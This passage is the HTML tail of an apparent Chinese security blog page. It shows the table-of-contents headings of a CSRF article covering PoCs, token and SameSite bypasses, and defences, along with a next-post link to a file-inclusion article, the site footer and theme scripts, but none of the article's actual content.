class="top-box-text">二、攻击场景与 PoC</span></a><ol class="top-box-child"><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#2-1-GET-%E6%96%B9%E5%BC%8F"><span class="top-box-text">2.1 GET 方式</span></a></li><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#2-2-POST-%E6%96%B9%E5%BC%8F"><span class="top-box-text">2.2 POST 方式</span></a></li><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#2-3-JSON-CSRF"><span class="top-box-text">2.3 JSON CSRF</span></a></li></ol></li><li class="top-box-item top-box-level-2"><a class="top-box-link" href="#%E4%B8%89%E3%80%81CSRF-Token-%E7%BB%95%E8%BF%87"><span class="top-box-text">三、CSRF Token 绕过</span></a><ol class="top-box-child"><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#Cookie-Tossing-%E6%94%BB%E5%87%BB%E9%93%BE"><span class="top-box-text">Cookie Tossing 攻击链</span></a></li></ol></li><li class="top-box-item top-box-level-2"><a class="top-box-link" href="#%E5%9B%9B%E3%80%81SameSite-Cookie-%E7%BB%95%E8%BF%87"><span class="top-box-text">四、SameSite Cookie 绕过</span></a><ol class="top-box-child"><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#4-1-None-%E2%80%94-%E7%9B%B4%E6%8E%A5%E6%89%93"><span class="top-box-text">4.1 None — 直接打</span></a></li><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#4-2-Lax-%E7%BB%95%E8%BF%87"><span class="top-box-text">4.2 Lax 绕过</span></a></li><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#4-3-Strict-%E7%BB%95%E8%BF%87"><span class="top-box-text">4.3 Strict 绕过</span></a></li></ol></li><li class="top-box-item top-box-level-2"><a class="top-box-link" href="#%E4%BA%94%E3%80%81Referer-Origin-%E6%A0%A1%E9%AA%8C%E7%BB%95%E8%BF%87"><span class="top-box-text">五、Referer &#x2F; Origin 校验绕过</span></a></li><li class="top-box-item top-box-level-2"><a class="top-box-link" href="#%E5%85%AD%E3%80%81%E9%AA%8C%E8%AF%81%E5%B7%A5%E5%85%B7"><span class="top-box-text">六、验证工具</span></a><ol class="top-box-child"><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#Burp-Suite-%E2%86%92-CSRF-PoC"><span class="top-box-text">Burp Suite → CSRF PoC</span></a></li><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#CSRFTester"><span class="top-box-text">CSRFTester</span></a></li><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#%E6%89%8B%E5%8A%A8-curl"><span class="top-box-text">手动 curl</span></a></li></ol></li><li class="top-box-item top-box-level-2"><a class="top-box-link" href="#%E4%B8%83%E3%80%81XSS-CSRF-%E7%BB%84%E5%90%88%E6%8B%B3"><span class="top-box-text">七、XSS + CSRF 组合拳</span></a></li><li class="top-box-item top-box-level-2"><a class="top-box-link" href="#%E5%85%AB%E3%80%81%E9%98%B2%E5%BE%A1"><span class="top-box-text">八、防御</span></a><ol class="top-box-child"><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#%E6%97%A0%E6%95%88%E9%98%B2%E5%BE%A1%EF%BC%88%E5%88%AB%E8%B8%A9%E5%9D%91%EF%BC%89"><span class="top-box-text">无效防御（别踩坑）</span></a></li><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#%E6%9C%89%E6%95%88%E9%98%B2%E5%BE%A1"><span class="top-box-text">有效防御</span></a></li></ol></li><li class="top-box-item top-box-level-2"><a class="top-box-link" href="#%E4%B9%9D%E3%80%81%E6%A1%88%E4%BE%8B%E5%8F%82%E8%80%83"><span class="top-box-text">九、案例参考</span></a></li></ol>
+        </div>
+          
+      </div>
+    </div>
+
+    
+      <div class="next-post">
+        <a class="purple-link" href="/2026/06/28/file-inclusion/">
+          <h3 class="post-title">
+            
+            下一篇：任意文件包含（LFI / RFI）
+          </h3>
+        </a>
+      </div>
+    
+  </div>
+
+
+
+
+
+
+
+<footer>
+<div class="site-footer">
+  <div class="social-container">
+    
+      
+        <a aria-label="跳转至github" href="https://github.com/z50n6" target="_blank">
+          <i class="icon icon-github"></i>
+        </a>
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+  
+    Powered by <a href="https://hexo.io/" target="_blank">Hexo</a> <a href="https://github.com/f-dong/hexo-theme-minimalism" target="_blank">Theme</a>
+  
+  
+  
+    
+     |
+    
+      <a href="/atom.xml" target="_blank">RSS</a>
+  
+  
+  
+  
+</div>
+</footer>
+
+
+      </div>
+    </div>
+    
+<script id="hexo-configurations"> window.theme_config = {"image":{"lazyload_enable":true,"lazyload_placeholder":null,"photo_zoom":"simple-lightbox"},"search":{"enable":true,"type":"json","placeholder":"输入关键词搜索...","algolia":{"appID":"","apiKey":"","indexName":""}},"language":"zh-CN"}; window.is_post = true; </script>
+
+<script src="/js/main.js"></script>
+
+
+
+
+
+
+  <script src="/js/simple-lightbox.min.js"></script><script>document.addEventListener('DOMContentLoaded', function() {new SimpleLightbox('.post-detail .simple-lightbox', {fileExt: false,captionsData:'alt'});});</script></body>
+</html>
+
